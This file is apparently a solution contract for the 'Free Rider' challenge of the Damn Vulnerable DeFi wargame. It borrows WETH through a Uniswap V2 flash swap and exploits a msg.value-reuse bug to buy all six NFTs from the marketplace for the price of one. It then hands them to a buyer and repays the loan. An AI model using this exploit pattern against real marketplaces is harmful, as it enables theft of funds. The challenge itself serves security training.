// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";

contract FreeRide is Test, IERC721Receiver {

    WETH9 internal weth;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    address freeRiderBuyer;

    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    constructor(
        address _freeRiderBuyer,
        address payable _weth,
        address payable _freeRiderNFTMarketplace,
        address _damnValuableNFT,
        address _uniswapV2Pair
    ){
         freeRiderBuyer = _freeRiderBuyer;
         weth = WETH9((_weth));
         freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
         damnValuableNFT = DamnValuableNFT(_damnValuableNFT);
         uniswapV2Pair   = IUniswapV2Pair(_uniswapV2Pair);
    }

    fallback() external payable{}
    receive() external payable{}

    function flashSwap() external {
        uniswapV2Pair.swap(0,NFT_PRICE,address(this),abi.encode(uniswapV2Pair.token1(),NFT_PRICE));
    }

    function onERC721Received(address, address, uint256,bytes memory)
        external pure override returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
     * re-use msg.value to buy all nfts
     */
    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata _data
    ) external{
        (, uint256 nftPrice) = abi.decode(_data,(address,uint256));
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for(uint8 i; i < AMOUNT_OF_NFTS; i++){
            tokenIds[i] = i;
        }
        weth.withdraw(weth.balanceOf(address(this)));
        freeRiderNFTMarketplace.buyMany{value:15 ether}(tokenIds);

        for(uint8 tokenId; tokenId < AMOUNT_OF_NFTS; tokenId++){
           require(damnValuableNFT.ownerOf(tokenId) == address(this), "not this nft owner");
           damnValuableNFT.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
        }

        uint256 fee = ((nftPrice * 3) / 997) + 1;
        weth.deposit{value:nftPrice + fee}();
        weth.transfer(address(uniswapV2Pair), nftPrice + fee);
    }
}